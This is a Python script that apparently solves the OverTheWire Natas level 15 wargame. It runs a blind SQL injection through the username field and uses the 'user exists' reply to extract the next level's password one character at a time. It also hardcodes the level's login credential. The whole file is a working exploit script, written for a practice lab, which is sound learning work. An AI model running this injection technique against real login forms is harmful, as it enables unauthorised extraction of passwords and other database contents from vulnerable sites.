from bs4 import BeautifulSoup as bs
import urllib
import base64
import binascii
import requests
import re
from string import *
import sys

u='natas15'
p='AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
l=f'http://{u}.natas.labs.overthewire.org/?debug=true'
C=ascii_lowercase+ascii_uppercase+digits
mypwd=[]
while len(mypwd)<len(p):
    for c in C:
        uname='natas16 " AND BINARY password LIKE "' + "".join(mypwd) + c + '%" #'
        resp=requests.post(l,data={'username':uname},auth=(u, p))
        if 'user exists' in resp.text:
            mypwd+=c,
            break
    print('cracked '+str(len(mypwd))+' characters')
print('password is: '+''.join(mypwd))
